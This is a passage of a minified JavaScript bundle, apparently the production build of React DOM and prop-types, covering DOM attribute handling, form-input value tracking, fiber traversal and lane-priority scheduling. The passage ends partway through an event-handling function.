( () => {
    var e = {
        496: (e, n, t) => {
            "use strict";
            var r = t(687);
            function a() {}
            function i() {}
            i.resetWarningCache = a,
            e.exports = function() {
                function e(e, n, t, a, i, l) {
                    if (l !== r) {
                        var o = new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");
                        throw o.name = "Invariant Violation",
                        o
                    }
                }
                function n() {
                    return e
                }
                e.isRequired = e;
                var t = {
                    array: e,
                    bigint: e,
                    bool: e,
                    func: e,
                    number: e,
                    object: e,
                    string: e,
                    symbol: e,
                    any: e,
                    arrayOf: n,
                    element: e,
                    elementType: e,
                    instanceOf: n,
                    node: e,
                    objectOf: n,
                    oneOf: n,
                    oneOfType: n,
                    shape: n,
                    exact: n,
                    checkPropTypes: i,
                    resetWarningCache: a
                };
                return t.PropTypes = t,
                t
            }
        }
        ,
        486: (e, n, t) => {
            e.exports = t(496)()
        }
        ,
        687: e => {
            "use strict";
            e.exports = "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED"
        }
        ,
        441: (e, n, t) => {
            "use strict";
            var r = t(94)
              , a = t(732);
            function i(e) {
                for (var n = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, t = 1; t < arguments.length; t++)
                    n += "&args[]=" + encodeURIComponent(arguments[t]);
                return "Minified React error #" + e + "; visit " + n + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
            }
            var l = new Set
              , o = {};
            function s(e, n) {
                u(e, n),
                u(e + "Capture", n)
            }
            function u(e, n) {
                for (o[e] = n,
                e = 0; e < n.length; e++)
                    l.add(n[e])
            }
            var c = !("undefined" === typeof window || "undefined" === typeof window.document || "undefined" === typeof window.document.createElement)
              , A = Object.prototype.hasOwnProperty
              , d = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/
              , f = {}
              , p = {};
            function v(e, n, t, r, a, i, l) {
                this.acceptsBooleans = 2 === n || 3 === n || 4 === n,
                this.attributeName = r,
                this.attributeNamespace = a,
                this.mustUseProperty = t,
                this.propertyName = e,
                this.type = n,
                this.sanitizeURL = i,
                this.removeEmptyString = l
            }
            var m = {};
            "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e) {
                m[e] = new v(e,0,!1,e,null,!1,!1)
            }
            )),
            [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach((function(e) {
                var n = e[0];
                m[n] = new v(n,1,!1,e[1],null,!1,!1)
            }
            )),
            ["contentEditable", "draggable", "spellCheck", "value"].forEach((function(e) {
                m[e] = new v(e,2,!1,e.toLowerCase(),null,!1,!1)
            }
            )),
            ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach((function(e) {
                m[e] = new v(e,2,!1,e,null,!1,!1)
            }
            )),
            "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e) {
                m[e] = new v(e,3,!1,e.toLowerCase(),null,!1,!1)
            }
            )),
            ["checked", "multiple", "muted", "selected"].forEach((function(e) {
                m[e] = new v(e,3,!0,e,null,!1,!1)
            }
            )),
            ["capture", "download"].forEach((function(e) {
                m[e] = new v(e,4,!1,e,null,!1,!1)
            }
            )),
            ["cols", "rows", "size", "span"].forEach((function(e) {
                m[e] = new v(e,6,!1,e,null,!1,!1)
            }
            )),
            ["rowSpan", "start"].forEach((function(e) {
                m[e] = new v(e,5,!1,e.toLowerCase(),null,!1,!1)
            }
            ));
            var h = /[\-:]([a-z])/g;
            function b(e) {
                return e[1].toUpperCase()
            }
            function g(e, n, t, r) {
                var a = m.hasOwnProperty(n) ? m[n] : null;
                (null !== a ? 0 !== a.type : r || !(2 < n.length) || "o" !== n[0] && "O" !== n[0] || "n" !== n[1] && "N" !== n[1]) && (function(e, n, t, r) {
                    if (null === n || "undefined" === typeof n || function(e, n, t, r) {
                        if (null !== t && 0 === t.type)
                            return !1;
                        switch (typeof n) {
                        case "function":
                        case "symbol":
                            return !0;
                        case "boolean":
                            return !r && (null !== t ? !t.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
                        default:
                            return !1
                        }
                    }(e, n, t, r))
                        return !0;
                    if (r)
                        return !1;
                    if (null !== t)
                        switch (t.type) {
                        case 3:
                            return !n;
                        case 4:
                            return !1 === n;
                        case 5:
                            return isNaN(n);
                        case 6:
                            return isNaN(n) || 1 > n
                        }
                    return !1
                }(n, t, a, r) && (t = null),
                r || null === a ? function(e) {
                    return !!A.call(p, e) || !A.call(f, e) && (d.test(e) ? p[e] = !0 : (f[e] = !0,
                    !1))
                }(n) && (null === t ? e.removeAttribute(n) : e.setAttribute(n, "" + t)) : a.mustUseProperty ? e[a.propertyName] = null === t ? 3 !== a.type && "" : t : (n = a.attributeName,
                r = a.attributeNamespace,
                null === t ? e.removeAttribute(n) : (t = 3 === (a = a.type) || 4 === a && !0 === t ? "" : "" + t,
                r ? e.setAttributeNS(r, n, t) : e.setAttribute(n, t))))
            }
            "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e) {
                var n = e.replace(h, b);
                m[n] = new v(n,1,!1,e,null,!1,!1)
            }
            )),
            "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e) {
                var n = e.replace(h, b);
                m[n] = new v(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)
            }
            )),
            ["xml:base", "xml:lang", "xml:space"].forEach((function(e) {
                var n = e.replace(h, b);
                m[n] = new v(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)
            }
            )),
            ["tabIndex", "crossOrigin"].forEach((function(e) {
                m[e] = new v(e,1,!1,e.toLowerCase(),null,!1,!1)
            }
            )),
            m.xlinkHref = new v("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),
            ["src", "href", "action", "formAction"].forEach((function(e) {
                m[e] = new v(e,1,!1,e.toLowerCase(),null,!0,!0)
            }
            ));
            var x = r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED
              , w = Symbol.for("react.element")
              , y = Symbol.for("react.portal")
              , C = Symbol.for("react.fragment")
              , E = Symbol.for("react.strict_mode")
              , j = Symbol.for("react.profiler")
              , z = Symbol.for("react.provider")
              , P = Symbol.for("react.context")
              , N = Symbol.for("react.forward_ref")
              , I = Symbol.for("react.suspense")
              , X = Symbol.for("react.suspense_list")
              , L = Symbol.for("react.memo")
              , O = Symbol.for("react.lazy");
            Symbol.for("react.scope"),
            Symbol.for("react.debug_trace_mode");
            var B = Symbol.for("react.offscreen");
            Symbol.for("react.legacy_hidden"),
            Symbol.for("react.cache"),
            Symbol.for("react.tracing_marker");
            var T = Symbol.iterator;
            function R(e) {
                return null === e || "object" !== typeof e ? null : "function" === typeof (e = T && e[T] || e["@@iterator"]) ? e : null
            }
            var M, H = Object.assign;
            function W(e) {
                if (void 0 === M)
                    try {
                        throw Error()
                    } catch (t) {
                        var n = t.stack.trim().match(/\n( *(at )?)/);
                        M = n && n[1] || ""
                    }
                return "\n" + M + e
            }
            var V = !1;
            function k(e, n) {
                if (!e || V)
                    return "";
                V = !0;
                var t = Error.prepareStackTrace;
                Error.prepareStackTrace = void 0;
                try {
                    if (n)
                        if (n = function() {
                            throw Error()
                        }
                        ,
                        Object.defineProperty(n.prototype, "props", {
                            set: function() {
                                throw Error()
                            }
                        }),
                        "object" === typeof Reflect && Reflect.construct) {
                            try {
                                Reflect.construct(n, [])
                            } catch (u) {
                                var r = u
                            }
                            Reflect.construct(e, [], n)
                        } else {
                            try {
                                n.call()
                            } catch (u) {
                                r = u
                            }
                            e.call(n.prototype)
                        }
                    else {
                        try {
                            throw Error()
                        } catch (u) {
                            r = u
                        }
                        e()
                    }
                } catch (u) {
                    if (u && r && "string" === typeof u.stack) {
                        for (var a = u.stack.split("\n"), i = r.stack.split("\n"), l = a.length - 1, o = i.length - 1; 1 <= l && 0 <= o && a[l] !== i[o]; )
                            o--;
                        for (; 1 <= l && 0 <= o; l--,
                        o--)
                            if (a[l] !== i[o]) {
                                if (1 !== l || 1 !== o)
                                    do {
                                        if (l--,
                                        0 > --o || a[l] !== i[o]) {
                                            var s = "\n" + a[l].replace(" at new ", " at ");
                                            return e.displayName && s.includes("<anonymous>") && (s = s.replace("<anonymous>", e.displayName)),
                                            s
                                        }
                                    } while (1 <= l && 0 <= o);
                                break
                            }
                    }
                } finally {
                    V = !1,
                    Error.prepareStackTrace = t
                }
                return (e = e ? e.displayName || e.name : "") ? W(e) : ""
            }
            function Y(e) {
                switch (e.tag) {
                case 5:
                    return W(e.type);
                case 16:
                    return W("Lazy");
                case 13:
                    return W("Suspense");
                case 19:
                    return W("SuspenseList");
                case 0:
                case 2:
                case 15:
                    return e = k(e.type, !1);
                case 11:
                    return e = k(e.type.render, !1);
                case 1:
                    return e = k(e.type, !0);
                default:
                    return ""
                }
            }
            function S(e) {
                if (null == e)
                    return null;
                if ("function" === typeof e)
                    return e.displayName || e.name || null;
                if ("string" === typeof e)
                    return e;
                switch (e) {
                case C:
                    return "Fragment";
                case y:
                    return "Portal";
                case j:
                    return "Profiler";
                case E:
                    return "StrictMode";
                case I:
                    return "Suspense";
                case X:
                    return "SuspenseList"
                }
                if ("object" === typeof e)
                    switch (e.$$typeof) {
                    case P:
                        return (e.displayName || "Context") + ".Consumer";
                    case z:
                        return (e._context.displayName || "Context") + ".Provider";
                    case N:
                        var n = e.render;
                        return (e = e.displayName) || (e = "" !== (e = n.displayName || n.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"),
                        e;
                    case L:
                        return null !== (n = e.displayName || null) ? n : S(e.type) || "Memo";
                    case O:
                        n = e._payload,
                        e = e._init;
                        try {
                            return S(e(n))
                        } catch (t) {}
                    }
                return null
            }
            function Z(e) {
                var n = e.type;
                switch (e.tag) {
                case 24:
                    return "Cache";
                case 9:
                    return (n.displayName || "Context") + ".Consumer";
                case 10:
                    return (n._context.displayName || "Context") + ".Provider";
                case 18:
                    return "DehydratedFragment";
                case 11:
                    return e = (e = n.render).displayName || e.name || "",
                    n.displayName || ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef");
                case 7:
                    return "Fragment";
                case 5:
                    return n;
                case 4:
                    return "Portal";
                case 3:
                    return "Root";
                case 6:
                    return "Text";
                case 16:
                    return S(n);
                case 8:
                    return n === E ? "StrictMode" : "Mode";
                case 22:
                    return "Offscreen";
                case 12:
                    return "Profiler";
                case 21:
                    return "Scope";
                case 13:
                    return "Suspense";
                case 19:
                    return "SuspenseList";
                case 25:
                    return "TracingMarker";
                case 1:
                case 0:
                case 17:
                case 2:
                case 14:
                case 15:
                    if ("function" === typeof n)
                        return n.displayName || n.name || null;
                    if ("string" === typeof n)
                        return n
                }
                return null
            }
            function D(e) {
                switch (typeof e) {
                case "boolean":
                case "number":
                case "string":
                case "undefined":
                case "object":
                    return e;
                default:
                    return ""
                }
            }
            function F(e) {
                var n = e.type;
                return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === n || "radio" === n)
            }
            function G(e) {
                e._valueTracker || (e._valueTracker = function(e) {
                    var n = F(e) ? "checked" : "value"
                      , t = Object.getOwnPropertyDescriptor(e.constructor.prototype, n)
                      , r = "" + e[n];
                    if (!e.hasOwnProperty(n) && "undefined" !== typeof t && "function" === typeof t.get && "function" === typeof t.set) {
                        var a = t.get
                          , i = t.set;
                        return Object.defineProperty(e, n, {
                            configurable: !0,
                            get: function() {
                                return a.call(this)
                            },
                            set: function(e) {
                                r = "" + e,
                                i.call(this, e)
                            }
                        }),
                        Object.defineProperty(e, n, {
                            enumerable: t.enumerable
                        }),
                        {
                            getValue: function() {
                                return r
                            },
                            setValue: function(e) {
                                r = "" + e
                            },
                            stopTracking: function() {
                                e._valueTracker = null,
                                delete e[n]
                            }
                        }
                    }
                }(e))
            }
            function Q(e) {
                if (!e)
                    return !1;
                var n = e._valueTracker;
                if (!n)
                    return !0;
                var t = n.getValue()
                  , r = "";
                return e && (r = F(e) ? e.checked ? "true" : "false" : e.value),
                (e = r) !== t && (n.setValue(e),
                !0)
            }
            function q(e) {
                if ("undefined" === typeof (e = e || ("undefined" !== typeof document ? document : void 0)))
                    return null;
                try {
                    return e.activeElement || e.body
                } catch (n) {
                    return e.body
                }
            }
            function U(e, n) {
                var t = n.checked;
                return H({}, n, {
                    defaultChecked: void 0,
                    defaultValue: void 0,
                    value: void 0,
                    checked: null != t ? t : e._wrapperState.initialChecked
                })
            }
            function J(e, n) {
                var t = null == n.defaultValue ? "" : n.defaultValue
                  , r = null != n.checked ? n.checked : n.defaultChecked;
                t = D(null != n.value ? n.value : t),
                e._wrapperState = {
                    initialChecked: r,
                    initialValue: t,
                    controlled: "checkbox" === n.type || "radio" === n.type ? null != n.checked : null != n.value
                }
            }
            function K(e, n) {
                null != (n = n.checked) && g(e, "checked", n, !1)
            }
            function _(e, n) {
                K(e, n);
                var t = D(n.value)
                  , r = n.type;
                if (null != t)
                    "number" === r ? (0 === t && "" === e.value || e.value != t) && (e.value = "" + t) : e.value !== "" + t && (e.value = "" + t);
                else if ("submit" === r || "reset" === r)
                    return void e.removeAttribute("value");
                n.hasOwnProperty("value") ? ee(e, n.type, t) : n.hasOwnProperty("defaultValue") && ee(e, n.type, D(n.defaultValue)),
                null == n.checked && null != n.defaultChecked && (e.defaultChecked = !!n.defaultChecked)
            }
            function $(e, n, t) {
                if (n.hasOwnProperty("value") || n.hasOwnProperty("defaultValue")) {
                    var r = n.type;
                    if (!("submit" !== r && "reset" !== r || void 0 !== n.value && null !== n.value))
                        return;
                    n = "" + e._wrapperState.initialValue,
                    t || n === e.value || (e.value = n),
                    e.defaultValue = n
                }
                "" !== (t = e.name) && (e.name = ""),
                e.defaultChecked = !!e._wrapperState.initialChecked,
                "" !== t && (e.name = t)
            }
            function ee(e, n, t) {
                "number" === n && q(e.ownerDocument) === e || (null == t ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + t && (e.defaultValue = "" + t))
            }
            var ne = Array.isArray;
            function te(e, n, t, r) {
                if (e = e.options,
                n) {
                    n = {};
                    for (var a = 0; a < t.length; a++)
                        n["$" + t[a]] = !0;
                    for (t = 0; t < e.length; t++)
                        a = n.hasOwnProperty("$" + e[t].value),
                        e[t].selected !== a && (e[t].selected = a),
                        a && r && (e[t].defaultSelected = !0)
                } else {
                    for (t = "" + D(t),
                    n = null,
                    a = 0; a < e.length; a++) {
                        if (e[a].value === t)
                            return e[a].selected = !0,
                            void (r && (e[a].defaultSelected = !0));
                        null !== n || e[a].disabled || (n = e[a])
                    }
                    null !== n && (n.selected = !0)
                }
            }
            function re(e, n) {
                if (null != n.dangerouslySetInnerHTML)
                    throw Error(i(91));
                return H({}, n, {
                    value: void 0,
                    defaultValue: void 0,
                    children: "" + e._wrapperState.initialValue
                })
            }
            function ae(e, n) {
                var t = n.value;
                if (null == t) {
                    if (t = n.children,
                    n = n.defaultValue,
                    null != t) {
                        if (null != n)
                            throw Error(i(92));
                        if (ne(t)) {
                            if (1 < t.length)
                                throw Error(i(93));
                            t = t[0]
                        }
                        n = t
                    }
                    null == n && (n = ""),
                    t = n
                }
                e._wrapperState = {
                    initialValue: D(t)
                }
            }
            function ie(e, n) {
                var t = D(n.value)
                  , r = D(n.defaultValue);
                null != t && ((t = "" + t) !== e.value && (e.value = t),
                null == n.defaultValue && e.defaultValue !== t && (e.defaultValue = t)),
                null != r && (e.defaultValue = "" + r)
            }
            function le(e) {
                var n = e.textContent;
                n === e._wrapperState.initialValue && "" !== n && null !== n && (e.value = n)
            }
            function oe(e) {
                switch (e) {
                case "svg":
                    return "http://www.w3.org/2000/svg";
                case "math":
                    return "http://www.w3.org/1998/Math/MathML";
                default:
                    return "http://www.w3.org/1999/xhtml"
                }
            }
            function se(e, n) {
                return null == e || "http://www.w3.org/1999/xhtml" === e ? oe(n) : "http://www.w3.org/2000/svg" === e && "foreignObject" === n ? "http://www.w3.org/1999/xhtml" : e
            }
            var ue, ce, Ae = (ce = function(e, n) {
                if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML"in e)
                    e.innerHTML = n;
                else {
                    for ((ue = ue || document.createElement("div")).innerHTML = "<svg>" + n.valueOf().toString() + "</svg>",
                    n = ue.firstChild; e.firstChild; )
                        e.removeChild(e.firstChild);
                    for (; n.firstChild; )
                        e.appendChild(n.firstChild)
                }
            }
            ,
            "undefined" !== typeof MSApp && MSApp.execUnsafeLocalFunction ? function(e, n, t, r) {
                MSApp.execUnsafeLocalFunction((function() {
                    return ce(e, n)
                }
                ))
            }
            : ce);
            function de(e, n) {
                if (n) {
                    var t = e.firstChild;
                    if (t && t === e.lastChild && 3 === t.nodeType)
                        return void (t.nodeValue = n)
                }
                e.textContent = n
            }
            var fe = {
                animationIterationCount: !0,
                aspectRatio: !0,
                borderImageOutset: !0,
                borderImageSlice: !0,
                borderImageWidth: !0,
                boxFlex: !0,
                boxFlexGroup: !0,
                boxOrdinalGroup: !0,
                columnCount: !0,
                columns: !0,
                flex: !0,
                flexGrow: !0,
                flexPositive: !0,
                flexShrink: !0,
                flexNegative: !0,
                flexOrder: !0,
                gridArea: !0,
                gridRow: !0,
                gridRowEnd: !0,
                gridRowSpan: !0,
                gridRowStart: !0,
                gridColumn: !0,
                gridColumnEnd: !0,
                gridColumnSpan: !0,
                gridColumnStart: !0,
                fontWeight: !0,
                lineClamp: !0,
                lineHeight: !0,
                opacity: !0,
                order: !0,
                orphans: !0,
                tabSize: !0,
                widows: !0,
                zIndex: !0,
                zoom: !0,
                fillOpacity: !0,
                floodOpacity: !0,
                stopOpacity: !0,
                strokeDasharray: !0,
                strokeDashoffset: !0,
                strokeMiterlimit: !0,
                strokeOpacity: !0,
                strokeWidth: !0
            }
              , pe = ["Webkit", "ms", "Moz", "O"];
            function ve(e, n, t) {
                return null == n || "boolean" === typeof n || "" === n ? "" : t || "number" !== typeof n || 0 === n || fe.hasOwnProperty(e) && fe[e] ? ("" + n).trim() : n + "px"
            }
            function me(e, n) {
                for (var t in e = e.style,
                n)
                    if (n.hasOwnProperty(t)) {
                        var r = 0 === t.indexOf("--")
                          , a = ve(t, n[t], r);
                        "float" === t && (t = "cssFloat"),
                        r ? e.setProperty(t, a) : e[t] = a
                    }
            }
            Object.keys(fe).forEach((function(e) {
                pe.forEach((function(n) {
                    n = n + e.charAt(0).toUpperCase() + e.substring(1),
                    fe[n] = fe[e]
                }
                ))
            }
            ));
            var he = H({
                menuitem: !0
            }, {
                area: !0,
                base: !0,
                br: !0,
                col: !0,
                embed: !0,
                hr: !0,
                img: !0,
                input: !0,
                keygen: !0,
                link: !0,
                meta: !0,
                param: !0,
                source: !0,
                track: !0,
                wbr: !0
            });
            function be(e, n) {
                if (n) {
                    if (he[e] && (null != n.children || null != n.dangerouslySetInnerHTML))
                        throw Error(i(137, e));
                    if (null != n.dangerouslySetInnerHTML) {
                        if (null != n.children)
                            throw Error(i(60));
                        if ("object" !== typeof n.dangerouslySetInnerHTML || !("__html"in n.dangerouslySetInnerHTML))
                            throw Error(i(61))
                    }
                    if (null != n.style && "object" !== typeof n.style)
                        throw Error(i(62))
                }
            }
            function ge(e, n) {
                if (-1 === e.indexOf("-"))
                    return "string" === typeof n.is;
                switch (e) {
                case "annotation-xml":
                case "color-profile":
                case "font-face":
                case "font-face-src":
                case "font-face-uri":
                case "font-face-format":
                case "font-face-name":
                case "missing-glyph":
                    return !1;
                default:
                    return !0
                }
            }
            var xe = null;
            function we(e) {
                return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement),
                3 === e.nodeType ? e.parentNode : e
            }
            var ye = null
              , Ce = null
              , Ee = null;
            function je(e) {
                if (e = ga(e)) {
                    if ("function" !== typeof ye)
                        throw Error(i(280));
                    var n = e.stateNode;
                    n && (n = wa(n),
                    ye(e.stateNode, e.type, n))
                }
            }
            function ze(e) {
                Ce ? Ee ? Ee.push(e) : Ee = [e] : Ce = e
            }
            function Pe() {
                if (Ce) {
                    var e = Ce
                      , n = Ee;
                    if (Ee = Ce = null,
                    je(e),
                    n)
                        for (e = 0; e < n.length; e++)
                            je(n[e])
                }
            }
            function Ne(e, n) {
                return e(n)
            }
            function Ie() {}
            var Xe = !1;
            function Le(e, n, t) {
                if (Xe)
                    return e(n, t);
                Xe = !0;
                try {
                    return Ne(e, n, t)
                } finally {
                    Xe = !1,
                    (null !== Ce || null !== Ee) && (Ie(),
                    Pe())
                }
            }
            function Oe(e, n) {
                var t = e.stateNode;
                if (null === t)
                    return null;
                var r = wa(t);
                if (null === r)
                    return null;
                t = r[n];
                e: switch (n) {
                case "onClick":
                case "onClickCapture":
                case "onDoubleClick":
                case "onDoubleClickCapture":
                case "onMouseDown":
                case "onMouseDownCapture":
                case "onMouseMove":
                case "onMouseMoveCapture":
                case "onMouseUp":
                case "onMouseUpCapture":
                case "onMouseEnter":
                    (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)),
                    e = !r;
                    break e;
                default:
                    e = !1
                }
                if (e)
                    return null;
                if (t && "function" !== typeof t)
                    throw Error(i(231, n, typeof t));
                return t
            }
            var Be = !1;
            if (c)
                try {
                    var Te = {};
                    Object.defineProperty(Te, "passive", {
                        get: function() {
                            Be = !0
                        }
                    }),
                    window.addEventListener("test", Te, Te),
                    window.removeEventListener("test", Te, Te)
                } catch (ce) {
                    Be = !1
                }
            function Re(e, n, t, r, a, i, l, o, s) {
                var u = Array.prototype.slice.call(arguments, 3);
                try {
                    n.apply(t, u)
                } catch (c) {
                    this.onError(c)
                }
            }
            var Me = !1
              , He = null
              , We = !1
              , Ve = null
              , ke = {
                onError: function(e) {
                    Me = !0,
                    He = e
                }
            };
            function Ye(e, n, t, r, a, i, l, o, s) {
                Me = !1,
                He = null,
                Re.apply(ke, arguments)
            }
            function Se(e) {
                var n = e
                  , t = e;
                if (e.alternate)
                    for (; n.return; )
                        n = n.return;
                else {
                    e = n;
                    do {
                        0 !== (4098 & (n = e).flags) && (t = n.return),
                        e = n.return
                    } while (e)
                }
                return 3 === n.tag ? t : null
            }
            function Ze(e) {
                if (13 === e.tag) {
                    var n = e.memoizedState;
                    if (null === n && (null !== (e = e.alternate) && (n = e.memoizedState)),
                    null !== n)
                        return n.dehydrated
                }
                return null
            }
            function De(e) {
                if (Se(e) !== e)
                    throw Error(i(188))
            }
            function Fe(e) {
                return null !== (e = function(e) {
                    var n = e.alternate;
                    if (!n) {
                        if (null === (n = Se(e)))
                            throw Error(i(188));
                        return n !== e ? null : e
                    }
                    for (var t = e, r = n; ; ) {
                        var a = t.return;
                        if (null === a)
                            break;
                        var l = a.alternate;
                        if (null === l) {
                            if (null !== (r = a.return)) {
                                t = r;
                                continue
                            }
                            break
                        }
                        if (a.child === l.child) {
                            for (l = a.child; l; ) {
                                if (l === t)
                                    return De(a),
                                    e;
                                if (l === r)
                                    return De(a),
                                    n;
                                l = l.sibling
                            }
                            throw Error(i(188))
                        }
                        if (t.return !== r.return)
                            t = a,
                            r = l;
                        else {
                            for (var o = !1, s = a.child; s; ) {
                                if (s === t) {
                                    o = !0,
                                    t = a,
                                    r = l;
                                    break
                                }
                                if (s === r) {
                                    o = !0,
                                    r = a,
                                    t = l;
                                    break
                                }
                                s = s.sibling
                            }
                            if (!o) {
                                for (s = l.child; s; ) {
                                    if (s === t) {
                                        o = !0,
                                        t = l,
                                        r = a;
                                        break
                                    }
                                    if (s === r) {
                                        o = !0,
                                        r = l,
                                        t = a;
                                        break
                                    }
                                    s = s.sibling
                                }
                                if (!o)
                                    throw Error(i(189))
                            }
                        }
                        if (t.alternate !== r)
                            throw Error(i(190))
                    }
                    if (3 !== t.tag)
                        throw Error(i(188));
                    return t.stateNode.current === t ? e : n
                }(e)) ? Ge(e) : null
            }
            function Ge(e) {
                if (5 === e.tag || 6 === e.tag)
                    return e;
                for (e = e.child; null !== e; ) {
                    var n = Ge(e);
                    if (null !== n)
                        return n;
                    e = e.sibling
                }
                return null
            }
            var Qe = a.unstable_scheduleCallback
              , qe = a.unstable_cancelCallback
              , Ue = a.unstable_shouldYield
              , Je = a.unstable_requestPaint
              , Ke = a.unstable_now
              , _e = a.unstable_getCurrentPriorityLevel
              , $e = a.unstable_ImmediatePriority
              , en = a.unstable_UserBlockingPriority
              , nn = a.unstable_NormalPriority
              , tn = a.unstable_LowPriority
              , rn = a.unstable_IdlePriority
              , an = null
              , ln = null;
            var on = Math.clz32 ? Math.clz32 : function(e) {
                return e >>>= 0,
                0 === e ? 32 : 31 - (sn(e) / un | 0) | 0
            }
              , sn = Math.log
              , un = Math.LN2;
            var cn = 64
              , An = 4194304;
            function dn(e) {
                switch (e & -e) {
                case 1:
                    return 1;
                case 2:
                    return 2;
                case 4:
                    return 4;
                case 8:
                    return 8;
                case 16:
                    return 16;
                case 32:
                    return 32;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                    return 4194240 & e;
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    return 130023424 & e;
                case 134217728:
                    return 134217728;
                case 268435456:
                    return 268435456;
                case 536870912:
                    return 536870912;
                case 1073741824:
                    return 1073741824;
                default:
                    return e
                }
            }
            function fn(e, n) {
                var t = e.pendingLanes;
                if (0 === t)
                    return 0;
                var r = 0
                  , a = e.suspendedLanes
                  , i = e.pingedLanes
                  , l = 268435455 & t;
                if (0 !== l) {
                    var o = l & ~a;
                    0 !== o ? r = dn(o) : 0 !== (i &= l) && (r = dn(i))
                } else
                    0 !== (l = t & ~a) ? r = dn(l) : 0 !== i && (r = dn(i));
                if (0 === r)
                    return 0;
                if (0 !== n && n !== r && 0 === (n & a) && ((a = r & -r) >= (i = n & -n) || 16 === a && 0 !== (4194240 & i)))
                    return n;
                if (0 !== (4 & r) && (r |= 16 & t),
                0 !== (n = e.entangledLanes))
                    for (e = e.entanglements,
                    n &= r; 0 < n; )
                        a = 1 << (t = 31 - on(n)),
                        r |= e[t],
                        n &= ~a;
                return r
            }
            function pn(e, n) {
                switch (e) {
                case 1:
                case 2:
                case 4:
                    return n + 250;
                case 8:
                case 16:
                case 32:
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                    return n + 5e3;
                default:
                    return -1
                }
            }
            function vn(e) {
                return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0
            }
            function mn() {
                var e = cn;
                return 0 === (4194240 & (cn <<= 1)) && (cn = 64),
                e
            }
            function hn(e) {
                for (var n = [], t = 0; 31 > t; t++)
                    n.push(e);
                return n
            }
            function bn(e, n, t) {
                e.pendingLanes |= n,
                536870912 !== n && (e.suspendedLanes = 0,
                e.pingedLanes = 0),
                (e = e.eventTimes)[n = 31 - on(n)] = t
            }
            function gn(e, n) {
                var t = e.entangledLanes |= n;
                for (e = e.entanglements; t; ) {
                    var r = 31 - on(t)
                      , a = 1 << r;
                    a & n | e[r] & n && (e[r] |= n),
                    t &= ~a
                }
            }
            var xn = 0;
            function wn(e) {
                return 1 < (e &= -e) ? 4 < e ? 0 !== (268435455 & e) ? 16 : 536870912 : 4 : 1
            }
            var yn, Cn, En, jn, zn, Pn = !1, Nn = [], In = null, Xn = null, Ln = null, On = new Map, Bn = new Map, Tn = [], Rn = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
            function Mn(e, n) {
                switch (e) {
                case "focusin":
                case "focusout":
                    In = null;
                    break;
                case "dragenter":
                case "dragleave":
                    Xn = null;
                    break;
                case "mouseover":
                case "mouseout":
                    Ln = null;
                    break;
                case "pointerover":
                case "pointerout":
                    On.delete(n.pointerId);
                    break;
                case "gotpointercapture":
                case "lostpointercapture":
                    Bn.delete(n.pointerId)
